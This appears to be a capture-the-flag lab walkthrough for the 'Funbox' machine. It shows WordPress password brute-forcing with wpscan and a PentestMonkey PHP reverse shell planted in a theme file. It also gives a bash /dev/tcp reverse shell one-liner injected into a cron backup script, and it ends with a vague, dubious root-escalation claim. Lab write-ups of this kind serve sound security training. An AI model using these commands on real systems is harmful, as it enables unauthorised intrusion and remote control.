Funbox

Target IP: 192.168.194.77

Scanning



There are four TCP ports open on the target machine: FTP, SSH, HTTP, and MySQL. I will begin enumeration with HTTP at port 80.

Enumeration

Port 80: HTTP

From the nmap scan above, it shows the vhost name is funbox.fritzx.box. I will need to append this hostname inside the /etc/hostname file.


The webpage above is displayed on port 80 after updating the /etc/hostname file.


Digging the source-code of this webpage shows it is using WordPress 5.4.2.


Performing a directory search using the command gobuster dir -u http://funbox.fritz.box -w /usr/share/wordlists/dirb/common.txt -x php,html,txt outputs the useful information above.


I used wpscan to scan the WordPress application on this port. I enumerated the users and their passwords. I was able to crack the password of all users using the following command wpscan --url http://funbox.fritz.box --enumerate u -P /usr/share/wordlists/rockyou.txt. Now I have the WordPress credentials, I can enumerate the application further.

Exploitation


Using the credentials admin:iubire worked as I had access to the WordPress application! I will use the simple attack vector to obtain a reverse shell connection by updating a PHP file from an unused theme.


I put the PHP PentestMonkey reverse shell script inside the 404.php file for Twenty Sixteen theme.


Then I started a listener on my local machine at port 8443. To activate the reverse shell, I browsed to http://funbox.fritz.box/wp-content/themes/twentysixteen/404.php. And then I received my reverse shell connection! Now I have a foothold on the machine as www-data.

Privilege Escalation


I found interesting files inside funny home directory. The .backup.sh file is owned by funny. However, we have every permission over this file; meaning, we can put a reverse shell script inside this file to obtain a shell as funny!


At first, I started a listener on port 8445 on my local machine. Then I removed the script that does the backup of the HTML files and replaced it with my reverse shell. The reverse shell script I used is /bin/bash -i >& /dev/tcp/192.168.45.174/8445 0>&1.


And then I received a connection from the reverse shell inside .backup.sh file as funny.


Running crontab -l shows the .backup.sh is still there. Apparently one way to gain a root shell from this is by executing crontab -r, exiting the shell, and restarting the shell.
